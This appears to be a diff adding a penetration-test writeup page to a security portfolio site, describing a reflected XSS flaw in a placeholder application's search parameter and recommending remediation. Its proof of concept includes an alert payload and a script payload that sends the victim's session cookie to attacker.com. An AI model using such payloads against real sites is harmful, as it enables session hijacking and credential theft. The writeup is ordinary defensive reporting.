@@ -1,0 +1,208 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<meta
+			name="description"
+			content="HEX3N - Cybersecurity Specialist & Penetration Tester Portfolio"
+		/>
+		<title>HEX3N // CYBERPUNK PEN-TESTER PORTFOLIO</title>
+		<link rel="stylesheet" href="../assets/css/writeups.css" />
+	</head>
+
+	<body class="cyberpunk-body">
+		<!-- Matrix Rain Background -->
+		<div id="matrix-rain" class="matrix-rain"></div>
+
+		<!-- Grid Background -->
+		<div class="grid-bg fixed top-0 left-0 w-full h-full z-0"></div>
+
+		<!-- Scanlines -->
+		<div
+			class="scanlines fixed top-0 left-0 w-full h-full pointer-events-none z-0"
+		></div>
+
+		<!-- Navigation -->
+		<nav
+			class="cyber-nav fixed top-0 left-0 w-full z-50 bg-black bg-opacity-80 backdrop-blur-sm border-b border-neongreen"
+		>
+			<div class="container mx-auto px-4 py-3">
+				<div class="flex justify-between items-center">
+					<div class="cyber-logo">
+						<span
+							class="text-neongreen font-bold text-xl glitch-effect"
+							data-text="HEX3N"
+							>HEX3N</span
+						>
+						<span class="text-neonpink text-sm ml-2"
+							>// SECURITY_SPECIALIST</span
+						>
+					</div>
+					<div class="hidden md:flex space-x-6">
+						<a href="../index.html" class="nav-link">HOME</a>
+						<a href="../about.html" class="nav-link">ABOUT</a>
+						<a href="../writeups.html" class="nav-link">WRITEUPS</a>
+					</div>
+					<div class="md:hidden">
+						<button type="button" class="mobile-menu-btn text-neongreen">
+							<span class="block w-6 h-0.5 bg-neongreen mb-1"></span>
+							<span class="block w-6 h-0.5 bg-neongreen mb-1"></span>
+							<span class="block w-6 h-0.5 bg-neongreen"></span>
+						</button>
+					</div>
+				</div>
+			</div>
+		</nav>
+
+		<main class="relative z-10 pt-20">
+			<div class="container mx-auto px-6 py-12 prose prose-invert max-w-3xl">
+				<h1>Penetration Testing Writeup: Cross-Site Scripting (XSS) Vulnerability</h1>
+<h2>Executive Summary</h2>
+<p>During a recent penetration test conducted on [Target Application], a critical
+Cross-Site Scripting (XSS) vulnerability was identified in the application&#39;s
+user input handling mechanism. This vulnerability allows an attacker to inject
+malicious scripts into web pages viewed by other users, potentially leading to
+session hijacking, data theft, or defacement of the website. This report details
+the vulnerability, its impact, proof of concept, and recommended remediation
+steps.</p>
+<h2>Vulnerability Details</h2>
+<ul>
+<li><strong>Vulnerability Type</strong>: Cross-Site Scripting (XSS) - Reflected</li>
+<li><strong>Severity</strong>: High</li>
+<li><strong>Affected Component</strong>: Search functionality on the main page</li>
+<li><strong>CWE</strong>: CWE-79 (Improper Neutralization of Input During Web Page Generation)</li>
+<li><strong>Location</strong>: <code>https://[target-application]/search?query=[input]</code></li>
+<li><strong>Discovered By</strong>: [PenTester Name]</li>
+<li><strong>Date Discovered</strong>: August 15, 2025</li>
+</ul>
+<h3>Description</h3>
+<p>The search functionality on the main page of [Target Application] does not
+properly sanitize user inputs in the query parameter. When a user submits a
+search query, the application reflects the input directly into the HTML response
+without encoding or validation. This allows an attacker to craft a malicious URL
+containing JavaScript code that executes in the context of the victim&#39;s browser.</p>
+<h3>Impact</h3>
+<ul>
+<li><strong>Session Hijacking</strong>: An attacker can steal session cookies, allowing
+unauthorized access to user accounts.</li>
+<li><strong>Phishing Attacks</strong>: Malicious scripts can display fake login forms to
+capture user credentials.</li>
+<li><strong>Data Theft</strong>: Sensitive information displayed on the page can be exfiltrated
+to an attacker-controlled server.</li>
+<li><strong>Website Defacement</strong>: The attacker can manipulate the page&#39;s content,
+damaging the application&#39;s reputation.</li>
+</ul>
+<h3>Proof of Concept</h3>
+<ol>
+<li>Navigate to the search page:
+<code>https://[target-application]/search?query=&lt;script&gt;alert(&#39;XSS Vulnerability&#39;);&lt;/script&gt;</code></li>
+<li>Observe that an alert box with the message &quot;XSS Vulnerability&quot; appears in the
+browser.</li>
+<li>A more malicious payload could be used, such as:<pre><code>https://[target-application]/search?query=&lt;script&gt;fetch(&#39;https://attacker.com/steal?cookie=&#39;+document.cookie);&lt;/script&gt;
+</code></pre>
+This payload sends the user&#39;s session cookie to an attacker-controlled
+server.</li>
+</ol>
+<h3>Steps to Reproduce</h3>
+<ol>
+<li>Open a web browser and navigate to <code>https://[target-application]/search</code>.</li>
+<li>In the search bar, enter the following payload:
+<code>&lt;script&gt;alert(&#39;XSS Vulnerability&#39;);&lt;/script&gt;</code>.</li>
+<li>Submit the search query.</li>
+<li>Verify that the JavaScript alert is triggered, confirming the vulnerability.</li>
+</ol>
+<h2>Remediation Recommendations</h2>
+<p>To mitigate this vulnerability, the following actions are recommended:</p>
+<ol>
+<li><strong>Input Validation and Sanitization</strong>:<ul>
+<li>Implement strict input validation to ensure only expected characters are
+allowed in the search query (e.g., alphanumeric characters and specific
+symbols).</li>
+<li>Use a server-side library like OWASP&#39;s AntiSamy or a similar HTML
+sanitization tool to filter out malicious code.</li>
+</ul>
+</li>
+<li><strong>Output Encoding</strong>:<ul>
+<li>Encode all user inputs when rendering them in the HTML response using
+context-appropriate encoding (e.g., HTML entity encoding for HTML content,
+JavaScript encoding for script contexts).</li>
+<li>Example: Convert <code>&lt;</code> to <code>&amp;lt;</code> and <code>&gt;</code> to <code>&amp;gt;</code> before rendering.</li>
+</ul>
+</li>
+<li><strong>Content Security Policy (CSP)</strong>:<ul>
+<li>Implement a strict CSP header to prevent the execution of inline scripts
+and restrict script sources to trusted domains.</li>
+<li>Example CSP header:
+<code>Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;;</code></li>
+</ul>
+</li>
+<li><strong>Secure Development Training</strong>:<ul>
+<li>Train developers on secure coding practices, emphasizing the risks of XSS
+and the importance of input validation and output encoding.</li>
+</ul>
+</li>
+<li><strong>Regular Security Testing</strong>:<ul>
+<li>Conduct periodic penetration testing and code reviews to identify and
+address similar vulnerabilities.</li>
+</ul>
+</li>
+</ol>
+<h2>Conclusion</h2>
+<p>The identified XSS vulnerability poses a significant risk to the security and
+integrity of [Target Application]. Immediate action is required to implement the
+recommended remediation steps. By addressing this issue, the application can
+protect its users from potential attacks and maintain trust in its security
+posture.</p>
+<h2>References</h2>
+<ul>
+<li>OWASP XSS Prevention Cheat Sheet:
+<a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+<li>CWE-79: <a href="https://cwe.mitre.org/data/definitions/79.html">https://cwe.mitre.org/data/definitions/79.html</a></li>
+</ul>
+
+			</div>
+
+			<!-- Footer -->
+			<footer
+				class="cyber-footer py-12 bg-black border-t border-gray-800 mt-12"
+			>
+				<div class="container mx-auto px-4">
+					<div class="flex flex-col md:flex-row justify-between items-center">
+						<div class="mb-6 md:mb-0">
+							<h3 class="text-2xl font-bold mb-2 text-neongreen">HEX3N_SEC</h3>
+							<p class="text-sm text-gray-400 cyber-text">
+								Penetration Testing & Security Consulting
+							</p>
+						</div>
+						<div class="flex space-x-6">
+							<a
+								href="#"
+								class="hover:text-neongreen transition-colors cyber-link"
+								>Imprint</a
+							>
+							<a
+								href="#"
+								class="hover:text-neonpink transition-colors cyber-link"
+								>Privacy</a
+							>
+							<a
+								href="#"
+								class="hover:text-neonblue transition-colors cyber-link"
+								>Legal</a
+							>
+						</div>
+					</div>
+					<div
+						class="border-t border-gray-800 mt-8 pt-8 text-center text-sm text-gray-400"
+					>
+						<p class="cyber-text">
+							© 2025 HEX3N. All systems operational.
+							<span class="text-neongreen">//</span> Secure by design.
+						</p>
+					</div>
+				</div>
+			</footer>
+		</main>
+	</body>
+</html>
